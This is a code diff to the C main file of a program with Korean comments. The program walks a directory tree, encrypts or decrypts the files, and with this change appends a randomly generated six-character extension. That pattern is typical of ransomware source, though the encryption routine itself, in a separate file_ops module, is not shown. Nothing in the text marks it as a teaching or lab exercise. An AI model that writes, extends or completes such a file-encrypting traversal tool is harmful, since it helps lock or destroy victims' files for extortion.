@@ -1,6 +1,22 @@
 #include <stdio.h>
 #include <string.h>
+#include <stdlib.h> 
+#include <time.h>
 #include "file_ops.h" 
+
+
+static void generate_random_string(char *buf, int len) {
+    // 확장자에 사용하기 좋은 문자들 (o, 0, O, l, 1 등은 뺌)
+    static const char charset[] = "abcdefghijkmnpqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ23456789";
+    
+    if (len <= 0) return;
+    
+    for (int i = 0; i < len; i++) {
+        int key = rand() % (sizeof(charset) - 2); // -2 (null terminator + 1)
+        buf[i] = charset[key];
+    }
+    buf[len] = '\0';
+}
 
 /**
  * @brief 프로그램 사용법을 출력하는 헬퍼 함수
@@ -22,6 +38,11 @@ int main(int argc, char *argv[]) {
         print_usage(argv[0]);
         return 1; // 오류 코드로 종료
     }
+
+    // 기본 세팅
+    srand(time(NULL));
+    char random_extension[7]; // 6글자 + 1 (null terminator)
+    generate_random_string(random_extension, 6);
     
     // 두 번째 인자로 모드 설정
     operation_mode mode;
@@ -39,10 +60,11 @@ int main(int argc, char *argv[]) {
     printf("--- Start Traversal ---\n");
     printf("  Target Mode: %s\n", (mode == MODE_ENCRYPT) ? "ENCRYPT" : "DECRYPT");
     printf("  Target Path: %s\n", start_path);
+    printf("  Using Extension: .%s\n", random_extension);
     printf("------------------------\n");
     
     // file_ops 모듈의 함수를 '모드'와 함께 호출
-    traverse_directory(start_path, mode);
+    traverse_directory(start_path, mode, random_extension);
     
     printf("------------------------\n");
     printf("--- End Traversal ---\n");
